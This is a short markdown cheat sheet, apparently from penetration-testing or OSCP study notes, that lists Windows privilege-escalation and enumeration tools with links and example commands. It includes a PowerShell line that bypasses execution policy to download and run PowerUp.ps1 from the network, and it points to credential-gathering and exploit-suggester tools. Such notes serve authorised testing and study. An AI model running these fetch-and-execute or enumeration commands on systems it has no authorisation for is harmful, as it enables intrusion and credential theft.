# Tools list

## Powerup
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

## Snaffler
Credential gathering tool
https://github.com/SnaffCon/Snaffler

## Waston
Missing KBs and suggest exploit for PE
https://github.com/rasta-mouse/Watson

## Beroot
Common PE vuln
https://github.com/AlessandroZ/BeRoot

## Windows-exploit-suggester
https://github.com/strozfriedberg/Windows-Exploit-Suggester

## windows-privesc-check
find misconfigures
https://github.com/pentestmonkey/windows-privesc-check

## WindowsExploits
windows KBs exploit files
https://github.com/abatchy17/WindowsExploits

## Seatbelt
similar with winpeas 
https://github.com/GhostPack/Seatbelt
```
Seatbelt.exe -group=all -full
Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```

## Powerless
for oscp? if the machine not support powershell use this.
https://github.com/gladiatx0r/Powerless

## JAWS
Common Windows PE
https://github.com/411Hall/JAWS

## winPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe

## wesng
exploit suggester
https://github.com/bitsadmin/wesng
```
# First obtain systeminfo
systeminfo
systeminfo > systeminfo.txt
# Then feed it to wesng
python3 wes.py --update-wes
python3 wes.py --update
python3 wes.py systeminfo.txt
```

## PrivescCheck
identify common vuln and misconfiguration
https://github.com/itm4n/PrivescCheck
```
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
```
